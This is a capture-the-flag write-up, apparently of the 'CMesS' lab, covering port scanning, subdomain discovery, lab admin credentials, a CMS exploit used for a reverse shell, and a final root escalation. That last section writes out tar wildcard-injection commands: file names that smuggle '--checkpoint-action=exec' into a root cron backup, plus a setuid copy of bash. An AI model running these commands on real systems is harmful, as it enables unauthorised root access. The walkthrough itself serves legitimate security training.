### Open Ports 
```bash
rustscan -a 10.10.182.17 -- -A

Open 10.10.182.17:22
Open 10.10.182.17:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvfxduhH7oHBPaAYuN66Mf6eL6AJVYqiFAh6Z0gBpD08k+pzxZDtbA3cdniBw3+DHe/uKizsF0vcAqoy8jHEXOOdsOmJEqYXjLJSayzjnPwFcuaVaKOjrlmWIKv6zwurudO9kJjylYksl0F/mRT6ou1+UtE2K7lDDiy4H3CkBZALJvA0q1CNc53sokAUsf5eEh8/t8oL+QWyVhtcbIcRcqUDZ68UcsTd7K7Q1+GbxNa3wftE0xKZ+63nZCVz7AFEfYF++glFsHj5VH2vF+dJMTkV0jB9hpouKPGYmxJK3DjHbHk5jN9KERahvqQhVTYSy2noh9CBuCYv7fE2DsuDIF
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGOVQ0bHJHx9Dpyf9yscggpEywarn6ZXqgKs1UidXeQqyC765WpF63FHmeFP10e8Vd3HTdT3d/T8Nk3Ojt8mbds=
|   256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFUGmaB6zNbqDfDaG52mR3Ku2wYe1jZX/x57d94nxxkC
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Gila CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:5.4
OS details: Linux 4.4, Linux 5.4
```
Then I map the \<IP> with cmess.thm. And then brute force directory with ffuf and found the /admin page.
![[cmess1.png]]

The home page
![[cmess2.png]]
And the admin log in page.
![[cmess3.png]]
I brute force subdomain and found the following.
![[cmess4.png]]
Add dev.cmess.thm to the /etc/hosts file. And browsing that url I found admin log in credentials
![[cmess5.png]]
`andre@cmess.thm:KPFTN_f2yxe%`
Using this credential I log in to the admin pannel.
![[cmess6.png]]
And found the cms version. 
Googling that version I found this exploit 
![[cmess7.png]]
Using this exploit I get the reverse shell. 
![[cmess8.png]]
![[cmess9.png]]
In /opt directory I found a .bak file that has andre's password.
![[cmess10.png]]
Using that password I logged in as andre and retrived the user flag.
![[cmess11.png]]
In `/etc/crontab` I found the following 
![[cmess12.png]]
All the contents from `/home/andre/backup` are backed up in every 2 minutes.  To escalate privilege I run the following commands.
```bash
echo 'cp /bin/bash /tmp/bash;chmod +s /tmp/bash' > /home/andre/backup/esc.sh
touch /home/andre/backup/--checkpoint=1
touch /home/andre/backup/--checkpoint-action=exec=sh\ esc.sh
```
To learn more about this privilege escalation [visit](https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c)
![[cmess13.png]]
